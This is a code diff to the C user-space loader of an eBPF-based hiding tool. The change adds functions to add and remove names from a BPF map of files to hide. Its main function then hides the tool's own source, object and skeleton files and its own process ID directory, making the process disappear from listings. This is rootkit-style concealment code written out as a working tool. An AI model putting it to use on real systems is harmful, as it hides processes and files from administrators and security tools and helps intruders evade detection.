@@ -48,7 +48,7 @@ int init_bpf(void)
     return err;
 }
 
-int add_blacklist_file(char *to_hide_name)
+int blacklist_file(char *to_hide_name, int action)
 {
     int mapfd, err = 0;
     char filename[32];
@@ -64,12 +64,27 @@ int add_blacklist_file(char *to_hide_name)
     strcpy(filename, to_hide_name);
 
     mapfd = bpf_map__fd(skel->maps.files_to_hide);
-    err = bpf_map_update_elem(mapfd, &filename, &filename_value, BPF_ANY);
+    
+    if (action == 0) {
+        err = bpf_map_delete_elem(mapfd, &filename);
+    } else {
+        err = bpf_map_update_elem(mapfd, &filename, &filename_value, BPF_ANY);
+    }
     if (err) {
         fprintf(stderr, "Failed to update files_to_hide map\n");
         return 1;
     }
     return err;
+}
+
+int add_blacklist_file(char *to_hide_name)
+{
+    return blacklist_file(to_hide_name, 1);
+}
+
+int remove_blacklist_file(char *to_hide_name)
+{
+    return blacklist_file(to_hide_name, 0);
 }
 
 int main(int argc, char *argv[])
@@ -78,8 +93,10 @@ int main(int argc, char *argv[])
     char my_pid_str[10];
 
     init_bpf();
+    add_blacklist_file("hide_pid");
     add_blacklist_file("hider.bpf.c");
-    add_blacklist_file("hide_pid.c");
+    add_blacklist_file("hider.bpf.o");
+    add_blacklist_file("hider.skel.h");
 
     sprintf(my_pid_str, "%d", my_pid);
     add_blacklist_file(my_pid_str); // Hiding a PID is the same as hiding any files (in this case, a folder named after my ID)
